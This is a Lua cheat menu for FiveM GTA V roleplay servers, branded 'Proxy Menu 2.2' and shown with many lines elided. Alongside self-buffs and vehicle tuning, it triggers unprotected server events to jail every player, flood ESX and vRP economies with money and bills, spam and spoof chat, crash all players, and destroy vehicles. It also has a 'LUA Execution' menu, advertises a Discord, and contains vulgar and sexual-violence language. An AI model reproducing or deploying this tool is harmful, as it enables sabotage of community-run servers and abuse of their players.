...
function proxy.CreateMenu(id, title)
...
function proxy.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		proxy.CreateMenu(id, menus[parent].title)
...
function proxy.CurrentMenu()
	return currentMenu
end

function proxy.OpenMenu(id)
	if id and menus[id] then
...
function proxy.IsMenuOpened(id)
	return isMenuVisible(id)
end

function proxy.IsAnyMenuOpened()
...
function proxy.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
...
function proxy.Button(text, subText)
...
function proxy.MenuButton(text, id)
	if menus[id] then
		if proxy.Button(text) then
			setMenuVisible(currentMenu, false)
...
function proxy.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if proxy.Button(text, checked) then
		bool = not bool
...
function proxy.ComboBox(text, items, currentIndex, selectedIndex, callback)
	...
	if proxy.Button(text, selectedItem) then
...
function proxy.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function proxy.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function proxy.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function proxy.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function proxy.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function proxy.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
...
function proxy.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function proxy.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function proxy.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
...
function proxy.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function proxy.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function proxy.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function proxy.SetMenuButtonPressedSound(id, name, set)
...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: ")
    end
end
    ...
    Citizen.CreateThread(function()
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome *Proxy MODZ 2.2* buy Mod Menu in ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome *Proxy MODZ 2.2* buy Mod Menu in ")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome *Proxy MODZ 2.2* buy Mod Menu in ")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Proxy Menu 2.2 ", 10000000)
        ...
        if ci then
			...
			function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: ',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: '
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
...
drawNotification("~h~-» ~g~revive success!")
	...
	if sall then
			...
			if spam then
                ...
                TriggerServerEvent('_chat:messageEntered', '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: ', {0, 0x99, 255}, '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: ')
                end
			end
...
Citizen.CreateThread(
	function()
		...
		proxy.CreateMenu("MainMenu", "∑ Proxy ~n~~y~MENU ∑")
		proxy.SetSubTitle("MainMenu", "VERSION 2.2")
		proxy.CreateSubMenu("Models", "MainMenu", "Model")
		proxy.CreateSubMenu("SelfMenu", "MainMenu", "PlayerMenu")
		proxy.CreateSubMenu("World", "MainMenu", "World")
		proxy.CreateSubMenu("Fuck", "MainMenu", "Fuck")
		proxy.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		proxy.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		proxy.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		proxy.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		proxy.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		proxy.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		proxy.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		proxy.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		proxy.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		proxy.CreateSubMenu("ESXMoney", "ServerMenu", "Money Options")
		proxy.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		proxy.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		proxy.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		proxy.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		proxy.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		proxy.CreateSubMenu("PlayerTrollMenu", "OnlinePlayerMenu", "Troll Options")
		proxy.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
		proxy.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
		proxy.CreateSubMenu("WeaponCustomization", "WepMenu", "Weapon Cusomization Options")
		proxy.CreateSubMenu('TorqueBoostMenu', 'VehMenu', 'Torque Boost ~b~>~s~')
	    proxy.CreateSubMenu(
            'WeaponTypes',
            'WepMenu',
            'Weapons'
        ...
        proxy.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        proxy.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
		proxy.CreateSubMenu('VehBoostMenu', 'VehMenu', 'Vehicle Boost')
		
        proxy.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Types')
        proxy.CreateSubMenu(
            'CarOptions',
            'CarTypeSelection',
            'Car Options'
        )
		proxy.CreateSubMenu('LSC', 'VehMenu', 'LSC Customs')
        proxy.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        proxy.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
		
		
		for i, da in pairs(be) do
            proxy.CreateSubMenu(da.id, 'tunings', da.name)
            if da.id == 'paint' then
                proxy.CreateSubMenu('primary', da.id, 'Primary Paint')
                proxy.CreateSubMenu('secondary', da.id, 'Secondary Paint')
                proxy.CreateSubMenu('rimpaint', da.id, 'Wheel Paint')
                proxy.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                proxy.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                proxy.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                proxy.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                proxy.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                proxy.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                proxy.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                proxy.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                proxy.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                proxy.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                proxy.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                proxy.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
		for i, da in pairs(bf) do
            proxy.CreateSubMenu(da.id, 'performance', da.name)
        end
        local SelectedPlayer
        while bm do
            ped = PlayerPedId()
            ...
            for i, da in pairs(be) do
                if proxy.IsMenuOpened('tunings') then
                    if b9 then
                        if bb == 'neon' then
                ...
                if proxy.IsMenuOpened(da.id) then
                    if da.id == 'wheeltypes' then
                        if proxy.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif proxy.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif proxy.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif proxy.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif proxy.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif proxy.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif proxy.Button('High End Wheels') then
                    ...
                    elseif da.id == 'neon' then
                        ...
                        for i, da in pairs(bg) do
                            ...
                            if proxy.Button(i, pricestring) then
                                if not b9 then
                                    bb = 'neon'
                    ...
                    elseif da.id == 'paint' then
                        if proxy.MenuButton('~h~~p~-> ~s~Primary Paint', 'primary') then
                        elseif proxy.MenuButton('~h~~p~-> ~s~Secondary Paint', 'secondary') then
                        elseif proxy.MenuButton('~h~~p~-> ~s~Wheel Paint', 'rimpaint') then
                        end
                        proxy.Display()
                    else
                        ...
                        for dg, dh in pairs(at) do
                            ...
                            if proxy.Button(dh.menuName, price) then
                                if not b9 then
                                    bb = da.id
            ...
            for i, da in pairs(bf) do
                if proxy.IsMenuOpened(da.id) then
                    ...
                    if proxy.Button('Stock ' .. da.name, pricestock) then
                        SetVehicleMod(veh, da.id, -1)
                    elseif proxy.Button(da.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, da.id, 0)
                    elseif proxy.Button(da.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, da.id, 1)
                    elseif proxy.Button(da.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, da.id, 2)
                    elseif da.id ~= 13 and da.id ~= 12 and proxy.Button(da.name .. ' Upgrade 4', price4) then
			...
			if proxy.IsMenuOpened("MainMenu") then
			    
			    drawNotification(" ∑ Proxy Menu 2.2 ∑  ~n~~h~WELCOME ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
			    drawNotification("~h~Have fun while using this menu | Version Is: ~h~~g~2.2 ~s~Made By ~r~Mr. Proxy#6683")
				drawNotification("~h~~g~Official Discord | Mr Tools | ~s~~n~~h~discord.gg/ZQNyRcgcp3")
				
				if proxy.MenuButton("→  ~h~~c~ONLINE ~s~PLAYERS", "OnlinePlayerMenu") then
				elseif proxy.MenuButton("→  ~h~~b~PLAYERS ~s~MENU", "SelfMenu") then
				elseif proxy.MenuButton("→  ~h~~o~MODELS ~s~MENU", "Models") then
				elseif proxy.MenuButton("→  ~h~~y~WORLD ~s~MENU", "World") then
				elseif proxy.MenuButton("→  ~h~~g~TELEPORT  ~s~MENU", "TeleportMenu") then
				elseif proxy.MenuButton("→  ~h~~m~VEHICLES  ~s~MENU", "VehMenu") then
				elseif proxy.MenuButton("→  ~h~~p~WEAPONS  ~s~MENU", "WepMenu") then
				elseif proxy.MenuButton("→  ~h~~r~FUCK  ~s~MENU", "Fuck") then
				elseif proxy.MenuButton("→  ~h~<FONT COLOR='#15f600'>∑ LUA ~s~MENU ∑", "ServerMenu") then
				elseif proxy.Button("X ~r~DISCONNECT ~s~X") then
					bm = false
				end

				proxy.Display()
			elseif proxy.IsMenuOpened("SelfMenu") then
				if
				proxy.CheckBox(
				...
				then 
				elseif proxy.ComboBox("Radius ~b~Distance", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
				...
				elseif proxy.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif proxy.Button("~h~~g~Revive") then
				SetEntityHealth(PlayerPedId(), 200)
				SetPedArmour(PlayerPedId(), 200)
				TriggerEvent("esx_status:set", "thirst", 1000000)
				TriggerEvent("esx_status:set", "hunger", 1000000)
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif proxy.Button("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif proxy.Button("~o~~h~Set hunger to ~s~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif proxy.Button("~b~~h~Set thirst to ~s~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif proxy.Button("~h~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif proxy.Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
					elseif proxy.Button("~b~Cuff ~s~Player") then
				...
				elseif
				proxy.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				proxy.CheckBox(
					"~h~Super Jump",
				...
				then
				elseif
				proxy.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				proxy.CheckBox(
					"~h~Invisible",
				...
				then
				elseif
				proxy.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		proxy.Display()
			elseif proxy.IsMenuOpened("TeleportMenu") then
				if proxy.Button("~h~Teleport ~h~~p~Waypoint ~r~(KEY 1)") then
				TeleportToWaypoint()
			 elseif proxy.Button("~h~Teleport ~h~~p~intro Vehicle ") then
			...
			elseif proxy.Button("~h~Teleport ~s~~p~To Coords") then
                TeleportToCoords()
			elseif proxy.Button("~h~Teleport ~h~~g~LSPD ") then
			    LSPD()
			elseif proxy.Button('~h~Teleport ~h~~g~FBI') then
				fbi()
			elseif proxy.Button('~h~Teleport ~h~~g~LS Customs') then
				ls()
			elseif proxy.Button('~h~Teleport ~h~~g~Main Garage') then
				gp()
		    elseif proxy.Button('~h~Teleport ~h~~g~Ammunation') then
			    Ammunation()
			elseif proxy.Button('~h~Teleport ~h~~g~Clothes shop') then
			    shopclothes()
			elseif proxy.Button('~h~Teleport ~h~~g~Barber') then
			    barber()
			elseif proxy.Button('~h~Teleport ~h~~g~Maze Bank') then
			    MazeBank()
			elseif proxy.Button('~h~Teleport ~h~~g~Spot') then
			    spot()
			elseif proxy.Button('~h~Teleport ~h~~g~Michael House') then
			    MichaelHouse()
			elseif proxy.Button('~h~Teleport ~h~~g~Trevor Trailer') then
			    trevor()
 
			 end

		proxy.Display()
			elseif proxy.IsMenuOpened("World") then
			if
				proxy.CheckBox(
				"~h~ESP",
				esp,
		...
		elseif
			...
			elseif proxy.CheckBox(
				...
				elseif proxy.CheckBox(
					...
					then
				elseif proxy.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif proxy.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
			end

		proxy.Display()
		elseif proxy.IsMenuOpened("Fuck") then
		if proxy.Button("~h~~r~Give All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
				...
				elseif proxy.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
		...
		elseif proxy.Button("~h~~y~(Attention) ~r~Fuck Server everything") then
                    nukeserver()
	elseif
		proxy.CheckBox(
	...
	then
		elseif proxy.Button("~h~~r~Set ~s~~h~All Nearby Vehicles Plate Text") then
            local plateInput = KeyboardInput("Enter Plate Text (8 Characters):" , "", 100000000)
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
      elseif proxy.Button("~h~~r~Close ~s~the whole square") then
 ...
 elseif proxy.Button("~h~~r~Rape ~s~All Players") then
                    RapeAllFunc()
	 elseif proxy.Button("~h~~r~Fake ~h~~s~chat Message") then 
	 local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
      elseif proxy.Button("~h~~r~Crash ~s~All Players") then
                    for i = 0, 128 do
	...
	then
	elseif proxy.Button("~h~~r~Spawn ~p~Lion ~w~all Players") then
	...
	elseif proxy.Button("~h~~r~Spawn ~p~SWAT ~w~all Players ") then
	 ...
	 elseif proxy.Button('~h~~r~Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
	...
	then
	elseif proxy.Button("~h~~r~ESX ~s~Fuck Server economy ~s~v~y~2") then
				    esxdestroyv2()
	elseif proxy.Button("~h~~r~VRP ~s~Fuck Server economy") then
				    vrpdestroy()
	elseif
		proxy.CheckBox(
	...
	then
	elseif proxy.Button("~h~~b~------Fuck all Vehicles------") then
	elseif proxy.Button("~h~~r~Rampinator") then
    ...
    elseif proxy.CheckBox("~h~~r~Delete~s~ Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then 
	elseif proxy.Button("~h~~r~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
	elseif proxy.CheckBox("~h~~r~Explode~s~ Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then
	elseif proxy.CheckBox("~h~~r~Fuck~s~ Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
	
				proxy.Display()
			elseif proxy.IsMenuOpened("WepMenu") then
			if proxy.MenuButton('~h~~r~→  ~y~Ammunition', 'WeaponTypes') then
			    elseif proxy.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
				elseif proxy.MenuButton("~r~→  ~s~Weapon", "SingleWepMenu") then
				elseif proxy.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif proxy.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif proxy.Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
			...
			elseif
				...
				elseif
				 ...
				 then
				 elseif
					 proxy.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 proxy.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end
				
				proxy.Display()
            elseif proxy.IsMenuOpened('WeaponTypes') then
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('WeaponTypeSelection') then
                for dp, dD in pairs(d4) do
                    if proxy.MenuButton(dD.name, 'WeaponOptions') then
                        d5 = dD
                    end
                end
                proxy.Display()
            elseif proxy.IsMenuOpened('WeaponOptions') then
                if proxy.Button('~h~~y~Spawn Weapon inventory') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(d5.id), 1000, false)
                end
                if proxy.Button('~h~+ ~g~Ammo') then
                ...
                for dp, dD in pairs(d5.mods) do
                    if proxy.MenuButton('~h~~r~> ~s~' .. dp, 'ModSelect') then
                        d6 = dD
                    end
                end
				proxy.Display()
            elseif proxy.IsMenuOpened('ModSelect') then
                for _, dD in pairs(d6) do
                    if proxy.Button(dD.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(d5.id), GetHashKey(dD.id))
                    end
                end

				proxy.Display()
			elseif proxy.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if proxy.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
				 ...
				 proxy.Display()
            elseif proxy.IsMenuOpened("WeaponCustomization") then
                if proxy.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif proxy.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif proxy.Button("~g~Add Special Finish") then
                ...
                elseif proxy.Button("~r~Remove Special Finish") then
                ...
                elseif proxy.Button("~g~Add Suppressor") then
                ...
                elseif proxy.Button("~r~Remove Suppressor") then
                ...
                elseif proxy.Button("~g~Add Scope") then
                ...
                elseif proxy.Button("~r~Remove Scope") then
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("VehMenu") then
			if proxy.Button("~r~→  ~s~Vehicles ~y~Name") then
					...
					elseif proxy.IsMenuOpened('compacts') then
			for i=1, #compacts do
				if proxy.Button(compacts[i]) then
					SpawnVeh(compacts[i], PlaceSelf)
				end
			end
			elseif proxy.MenuButton('~r~→  ~s~Vehicles ~r~List', 'CarTypes') then
			elseif proxy.MenuButton('~r~→  ~o~LSC ~s~Customs', 'LSC') then
			elseif proxy.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
			elseif proxy.MenuButton('~r~→  ~s~Torque Boost', 'TorqueBoostMenu') then
			elseif proxy.Button("~h~Buy ~b~vehicle ~s~~h~for ~g~free") then fv()
				elseif proxy.Button("~h~~g~Repair ~b~Vehicle~s~ (Key 2)") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif proxy.Button("~h~~g~Repair ~y~Engine") then
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
				...
				elseif proxy.Button("~h~Max ~b~Exterior Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif proxy.Button("~h~Max ~b~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif proxy.Button("~h~Max All ~b~Tuning") then
				...
				then
			    elseif proxy.Button("~h~~b~Change License Plate") then
					local playerPed = GetPlayerPed(-1)
			...
			elseif proxy.CheckBox(
				...
				proxy.Display()
            elseif proxy.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(be) do
                    if da.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if proxy.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'neon' then
                        if proxy.MenuButton(da.name, da.id) then
                        end
                ...
                if proxy.Button('Xenon Headlight', xenonStatus) then
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if proxy.MenuButton(da.name, da.id) then
                    end
                ...
                if proxy.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                proxy.Display()
            elseif proxy.IsMenuOpened('primary') then
                proxy.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                proxy.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                proxy.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                proxy.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                proxy.Display()
            elseif proxy.IsMenuOpened('secondary') then
                proxy.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                proxy.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                proxy.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                proxy.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                proxy.Display()
            elseif proxy.IsMenuOpened('rimpaint') then
                proxy.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                proxy.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                proxy.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                proxy.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                proxy.Display()
            elseif proxy.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    ...
                    if proxy.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('matte1') then
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('metal1') then
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
            ...
            elseif proxy.IsMenuOpened('metal3') then
                ...
                proxy.Display()
            elseif proxy.IsMenuOpened('AICONTROLMENU') then
                if proxy.Button('~h~Configure AI ~g~Speed') then
                ...
                elseif proxy.Button('~h~AI Drive (Waypoint_Slow)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif proxy.Button('~h~AI Drive (Waypoint_Fast)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif proxy.Button('~h~Stop AI') then
				 ...
				 proxy.Display()
            elseif proxy.IsMenuOpened('LSC') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                proxy.MenuButton('~h~Exterior ~r~Tuning', 'tunings')
                proxy.MenuButton('~h~Performance ~r~Tuning', 'performance')
			
				proxy.Display()
            elseif proxy.IsMenuOpened('CarTypes') then
                for i, dF in ipairs(aY) do
                    if proxy.MenuButton('~h~~r~> ~s~' .. dF, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                proxy.Display()
            elseif proxy.IsMenuOpened('CarTypeSelection') then
                for i, dF in ipairs(aZ[carTypeIdx]) do
                    if proxy.MenuButton('~h~~r~# ~s~' .. dF, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                proxy.Display()
            elseif proxy.IsMenuOpened('CarOptions') then
			if proxy.Button('~h~~y~-Spawn intro vehicle-') then
                ...
                elseif proxy.Button('~h~~g~-Spawn vehicle-') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = aZ[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
		...
		proxy.Display()
				...
				elseif proxy.IsMenuOpened('TorqueBoostMenu') then 
			if proxy.CheckBox('Engine Torque boost ~h~~g~x2', Torque2, function(enabled)
				Torque2 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x4', Torque4, function(enabled)
				Torque4 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x8', Torque8, function(enabled)
				Torque8 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x16', Torque16, function(enabled)
				Torque16 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x32', Torque32, function(enabled)
				Torque32 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x64', Torque64, function(enabled)
				Torque64 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x128', Torque128, function(enabled)
				Torque128 = enabled
			end) then
